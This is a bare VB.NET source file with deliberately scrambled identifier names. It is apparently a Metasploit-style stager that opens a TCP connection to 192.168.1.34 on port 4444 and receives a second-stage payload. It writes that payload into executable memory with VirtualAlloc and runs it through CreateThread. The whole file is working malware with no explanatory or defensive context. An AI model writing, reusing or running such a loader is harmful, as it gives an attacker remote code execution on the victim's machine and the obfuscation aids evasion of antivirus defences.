Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.InteropServices

Module Module1
    Private Function OtqiHYWupUdSQUR(ByVal lLrKuUvsHLhkv As String, ByVal jLWPbjZ As Integer) As Byte()
        Dim NEQPzlIg As IPEndPoint = New IPEndPoint(IPAddress.Parse(lLrKuUvsHLhkv), jLWPbjZ)
        Dim HzPWgYsOmqhEH As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        Try
            HzPWgYsOmqhEH.Connect(NEQPzlIg)
        Catch ex As Exception
            Return Nothing
        End Try
        Dim WmbrCn As Byte() = New Byte(4) {}
        HzPWgYsOmqhEH.Receive(WmbrCn, 4, 0)
        Dim dNyHjypRkSjuvD As Int16 = BitConverter.ToInt32(WmbrCn, 0)
        Dim cQwcJkCwSymYFxz As Byte() = New Byte(Convert.ToInt32(dNyHjypRkSjuvD) + 5) {}
        Dim rXAlTZnzoPDi As Integer = 0
        While rXAlTZnzoPDi < dNyHjypRkSjuvD
            rXAlTZnzoPDi += HzPWgYsOmqhEH.Receive(cQwcJkCwSymYFxz, rXAlTZnzoPDi + 5, If(((dNyHjypRkSjuvD - rXAlTZnzoPDi) < 4096), (dNyHjypRkSjuvD - rXAlTZnzoPDi), 4096), 0)
        End While
        Dim FMbEEgTLzdeNq As Byte() = BitConverter.GetBytes(CInt(HzPWgYsOmqhEH.Handle))
        Array.Copy(FMbEEgTLzdeNq, 0, cQwcJkCwSymYFxz, 1, 4)
        cQwcJkCwSymYFxz(0) = &HBF
        Return cQwcJkCwSymYFxz
    End Function

    Sub dsmkBEmkHv(ByVal aptjjnVZK As Byte())
        If aptjjnVZK IsNot Nothing Then
            Dim yJhwRUydDPf As UInt32 = VirtualAlloc(0, aptjjnVZK.Length, &H1000, &H40)
            Marshal.Copy(aptjjnVZK, 0, CType((yJhwRUydDPf), IntPtr), aptjjnVZK.Length)
            Dim srdRecoaq As UInt32 = IntPtr.Zero
            Dim AFxdECKUFldX As UInt32 = 0
            Dim ktakwyDDgWW As UInt32 = IntPtr.Zero
            srdRecoaq = CreateThread(0, 0, yJhwRUydDPf, ktakwyDDgWW, 0, AFxdECKUFldX)
            WaitForSingleObject(srdRecoaq, &HFFFFFFF)
        End If
    End Sub
    Sub Main()
        Dim yhoLtKZHQMsW As Byte() = Nothing
        yhoLtKZHQMsW = OtqiHYWupUdSQUR("192.168.1.34", 4444)
        dsmkBEmkHv(yhoLtKZHQMsW)
    End Sub

    <DllImport("kernel32.dll", SetLastError:=True, CharSet:=CharSet.Ansi)>
    Private Function VirtualAlloc(ByVal hrQsLyuklQaNVE As UInt32, ByVal FcxEdCCJws As UInt32, ByVal ILIxYzboqICT As UInt32, ByVal FanIGUDCoB As UInt32) As UInt32

    End Function

    <DllImport("kernel32.dll", SetLastError:=True, CharSet:=CharSet.Ansi)>
    Private Function CreateThread(ByVal FYfeXksYDO As UInt32, ByVal FxFhOEeBA As UInt32, ByVal YnjUxZh As UInt32, ByVal ffNSYlRbdUeN As IntPtr, ByVal dSzgeGTERKoK As UInt32, ByRef mbZyMt As UInt32) As UInt32

    End Function
    <DllImport("kernel32.dll", SetLastError:=True, CharSet:=CharSet.Ansi)>
    Private Function WaitForSingleObject(ByVal XNJVDXZZtsRgZ As IntPtr, ByVal PzafTWITkPANO As UInt32) As UInt32

    End Function

End Module
